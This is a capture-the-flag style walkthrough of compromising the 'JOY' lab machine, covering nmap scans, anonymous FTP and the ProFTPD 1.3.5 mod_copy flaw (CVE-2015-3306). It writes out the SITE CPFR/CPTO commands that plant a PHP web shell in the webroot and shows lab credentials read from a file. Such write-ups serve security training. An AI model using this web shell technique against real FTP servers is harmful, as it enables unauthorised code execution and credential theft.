```
export IP=192.168.56.101
```
## Summary
1. Scanned both TCP and UDP.
2. [TCP] Anonymous login detected on FTP -> grabbed directory listing. 
3. [UDP] TFTP is listening -> grabbed version number from home dir.
4. ProFTPd service is vulnerable (CVE-2015-3306).
5. Got shell -> grab credentials from webroot.
6. sudo -l -> Root. 

## Nmap Results
### TCP Scan
<pre style="font-size: 12px";>
┌──(kali㉿kali)-[~/pentesting/joy]
└─$ nmap -p- -sV -sT -A $IP -oA nmap
PORT    STATE SERVICE     VERSION
<font color=red>21</font>/tcp  open  ftp         <font color=red>ProFTPD</font>
| ftp-anon:<font color=red> Anonymous FTP login allowed</font> (FTP code 230)
| drwxrwxr-x   2 ftp      ftp          4096 Jan  6  2019 download
|_drwxrwxr-x   2 ftp      ftp          4096 Jan 10  2019 upload
<font color=red>22</font>/tcp  open  ssh         <font color=red>Dropbear</font> sshd <font color=red>0.34</font> (protocol 2.0)
<font color=red>25</font>/tcp  open  smtp        Postfix smtpd
| ssl-cert: Subject: commonName=JOY
| Subject Alternative Name: DNS:JOY
| Not valid before: 2018-12-23T14:29:24
|_Not valid after:  2028-12-20T14:29:24
|_ssl-date: TLS randomness does not represent time
|_smtp-commands: JOY.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8
<font color=red>80</font>/tcp  open  http        Apache httpd 2.4.25
|_http-server-header: <font color=red>Apache/2.4.25</font> (<font color=red>Debian</font>)
|_http-title: Index of /
| http-ls: Volume /
| SIZE  TIME              FILENAME
| -     2016-07-19 20:03  ossec/
|_
..SNIP..
</pre>
### UDP Scan
<pre style="font-size: 12px";>
──(kali㉿kali)-[~/pentesting/joy]
└─$ sudo nmap --top-ports=20 -sU -A -oN nmap/udp_scan_top20 $IP
PORT      STATE         SERVICE      VERSION
53/udp    closed        domain
67/udp    closed        dhcps
68/udp    open|filtered dhcpc
69/udp    closed        tftp
123/udp   open          ntp          NTP v4 (unsynchronized)
| ntp-info:
|_
135/udp   closed        msrpc
137/udp   open          netbios-ns   Samba nmbd netbios-ns (workgroup: WORKGROUP)
| nbns-interfaces:
|   hostname: JOY
|   interfaces:
|_    192.168.56.101
138/udp   open|filtered netbios-dgm
139/udp   closed        netbios-ssn
161/udp   open          snmp         SNMPv1 server; net-snmp SNMPv3 server (public)
| snmp-sysdescr: Linux JOY 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64
|_  System uptime: 19m43.98s (118398 timeticks)
| snmp-processes:
|   1:
|     Name: systemd
|     Path: /sbin/init
..SNIP..
701: 
|     Name: in.<font color=red>tftpd</font>
|     Path: /usr/sbin/in.tftpd
|   <font color=red>  Params: --listen --user tftp --address 0.0.0.0:36969 --secure /home/patrick</font>
..SNIP..
</pre>

<pre style="font-size: 12px";>
┌──(kali㉿kali)-[~/pentesting/joy]
└─$ wget -r ftp://anonymous:@192.168.56.101/
</pre>
<pre style="font-size: 12px";>
──(kali㉿kali)-[~/pentesting/joy]
└─$ cat version_control
Version Control of External-Facing Services:

Apache: 2.4.25
Dropbear SSH: 0.34
ProFTPd: 1.3.5
Samba: 4.5.12

We should switch to OpenSSH and upgrade ProFTPd.

Note that we have some other configurations in this machine.
1. The webroot is no longer /var/www/html. We have changed it to /var/www/tryingharderisjoy.
2. I am trying to perform some simple bash scripting tutorials. Let me see how it turns out.
</pre>

[ProFTPD 1.3.5 Mod_Copy Command Execution](https://www.rapid7.com/db/modules/exploit/unix/ftp/proftpd_modcopy_exec/):
"...Any **unauthenticated** client can leverage these commands to copy files from any part of the filesystem to a chosen destination."

I use the exploit from [here](https://github.com/t0kx/exploit-CVE-2015-3306/blob/master/exploit.py). It boils down to these four lines:
<pre style="font-size: 12px";>
┌──(kali㉿kali)-[~/pentesting/joy/nmap]
└─$ ftp $IP <font color=gray># login without creds or you can use nc $IP 21</font>
</pre>
```
site cpfr /proc/self/cmdline
site cpto /tmp/.<?php echo passthru($_GET['cmd']); ?>
site cpfr /tmp/.<?php echo passthru($_GET['cmd']); ?>
site cpto /var/www/tryingharderisjoy/rce.php
```

![](../../Assets/images/Pasted%20image%2020220805153906.png)

<pre style="font-size: 12px";>
www-data@JOY:/var/www/tryingharderisjoy/ossec$ cat patricksecretsofjoy
credentials for JOY:
patrick:apollo098765
root:howtheheckdoiknowwhattherootpasswordis -> wrong

how would these hack3rs ever find such a page?
</pre>

